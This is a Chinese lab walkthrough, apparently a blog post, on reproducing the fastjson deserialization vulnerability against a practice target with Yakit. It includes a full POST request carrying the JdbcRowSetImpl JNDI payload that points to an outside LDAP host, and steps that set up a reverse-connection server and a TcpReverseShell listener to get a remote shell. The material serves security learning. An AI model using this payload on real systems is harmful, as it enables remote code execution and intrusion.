#  Yakit复现fastjson漏洞  
 StudySec   2026-01-06 05:28  
  
一、公网部署 yakit，命令如下：  
```
yak grpc --host 0.0.0.0 --port 8087 --secret 密码随意设置 --tls
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tb6OwBlojEicf9kxkHeUgiau4dSP83p1C9HEJlONEQlsvk9u4t05GF8Q0twic0ibBHNUNBcw5btkrjule52wVP2Org/640?wx_fmt=png&from=appmsg "")  
  
二、连接 yakit，配置好证书和密码之后启动连接。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tb6OwBlojEicf9kxkHeUgiau4dSP83p1C9An9QQ2ichhIMuq3JI7OPia2m53Eqib1f4k0k5m4ejsgolaZI3N2yLAoiag/640?wx_fmt=png&from=appmsg "")  
  
三、打开 fastjson 靶场，url：http://123.58.224.8:36696/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tb6OwBlojEicf9kxkHeUgiau4dSP83p1C92uhKYtluibbvuiaIu32ia1qCupCbdafSib0n5wn2x8AiaEQExCuR9sviaW3Q/640?wx_fmt=png&from=appmsg "")  
  
首先抓去 Burp 数据包。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Tb6OwBlojEicf9kxkHeUgiau4dSP83p1C9QnKFdwM2GNE5Waa8eEaHmkmnFTQia5BsykgpXLvLMJrIWlImY9Q4ZNA/640?wx_fmt=jpeg "")  
  
将 GET 请求修改为 POST 请求，然后将Content-Type  
修改为application/json  
，并添加 payload  
。  
```
POST / HTTP/1.1
Host: 123.58.224.8:36696
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json
{
    "name":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "x":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://x.x.x.x:9999/Exploit",
        "autoCommit":true
    }
}
```  
  
首先利用 DNSLOG 进行探测漏洞是否存在。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Tb6OwBlojEicf9kxkHeUgiau4dSP83p1C9GO4vmPiaiayZictycR9W47XTJvibTkoT7iaQGOXCFRvlsT2IdGfWyuJkibjg/640?wx_fmt=jpeg "")  
  
DNSLOG 回显成功。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Tb6OwBlojEicf9kxkHeUgiau4dSP83p1C9Ns5TJykJN4w5UlzcH0uDd9YA1k9vdUx3yAWCFAZXhxGqAqkWyxGFXA/640?wx_fmt=jpeg "")  
  
接着开启反连服务器。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Tb6OwBlojEicf9kxkHeUgiau4dSP83p1C9MIria5BcuewMxKfMt3coFvzeVNE9WqmsZz9iccGOLkzWhLdibicWgbFzgA/640?wx_fmt=jpeg "")  
  
输入反连地址和反连端口，点击启动。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tb6OwBlojEicf9kxkHeUgiau4dSP83p1C9iatLD7iaLR5408eUQj00thWenrc3KKr493O7G6OeeSGaCLsUZB5CCBdQ/640?wx_fmt=png&from=appmsg "")  
  
点击 payload 配置。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tb6OwBlojEicf9kxkHeUgiau4dSP83p1C9rFabO8vg4iciasAbkibpJMuRCSKkJOwWPDia1CnbgRDHUNbsIHguNhiau9Q/640?wx_fmt=png&from=appmsg "")  
  
选择 TcpReverseShell  
，反弹一个 shell，填写反连主机和反连端口，点击生成。  
  
接着选择端口监听器，监听 7788 端口。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tb6OwBlojEicf9kxkHeUgiau4dSP83p1C9DwFYXrMF1SyNau3mp54gCSnHXqFYicV6ZeTDrhibbR1ouRNQy6jV8qiaw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Tb6OwBlojEicf9kxkHeUgiau4dSP83p1C9tHHVTpib9ibNNnW0sMFK9qsSQE3B9UOs7t0TpYhgrR8icCaHAHqaTpWIw/640?wx_fmt=jpeg "")  
  
出现如下界面，说明监听成功。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Tb6OwBlojEicf9kxkHeUgiau4dSP83p1C9ejCQge7sTkFwMGNRicrNXWYAFmjLO8dNxu1F8GgiblliaN2XHm45NQpbw/640?wx_fmt=jpeg "")  
  
然后复制ldap://xx.xx.xx.xx:8085/rlDhxdBU  
到 payload 里面，进行回弹 shell。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tb6OwBlojEicf9kxkHeUgiau4dSP83p1C91g90SetHCvmJAXyHHhWIMQbsQzPVbXg4K8SfhHTfnaYiaGpWwQrZWvw/640?wx_fmt=png&from=appmsg "")  
  
成功反弹 shell。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tb6OwBlojEicf9kxkHeUgiau4dSP83p1C9N3KSA4HQTiafM0X4TBvPHyCLVujNANP6msZcIfbbS11taVzUmkWezfw/640?wx_fmt=png&from=appmsg "")  
  
